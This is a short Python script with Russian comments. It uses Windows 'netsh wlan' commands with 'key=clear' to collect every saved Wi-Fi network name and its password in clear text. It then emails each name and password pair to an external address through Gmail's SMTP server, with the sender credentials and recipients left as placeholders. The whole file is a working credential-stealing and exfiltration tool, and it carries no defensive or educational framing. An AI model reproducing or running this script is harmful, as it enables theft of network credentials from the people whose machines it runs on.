# Импортируем необходимые библиотеки
import subprocess 
import smtplib

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode("cp866").split('\n') # Вводится команда netsh wlan show profiles ...
profiles = [i.split(":")[1][1:-1] for i in data if "Все профили пользователей" in i]              # ... , декодируется с помощью шифровки cp866 
for i in profiles:                                                                                
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp866').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Содержимое ключа" in b]
    try:                                                            # Конструкция try-except для отслеживания и перехвата ошибки (IndexError)
        wifi_passwords = ("{:<30}|  {:<}".format(i, results[0]))    # Настройка формата , в котором будет отображаться  |логин - пароль|
        smtpObj = smtplib.SMTP('smtp.gmail.com', 587)               # Обращаемся к серверу smtp.gmail.com к порту 587
        smtpObj.starttls()                                          # Шифровка , для "надежности" (без этого будет выбивать ошибку)
        smtpObj.login('Login','Password')                           # Логин и пароль вашей почты
        smtpObj.sendmail('addr_from','addr_to', wifi_passwords )    # Логин почты-отправителя , логин почты-получателя , сам текст сообщения
        smtpObj.quit()                                              # Выход
    except IndexError:                                              
        print ("{:<30}|  {:<}".format(i, ""))

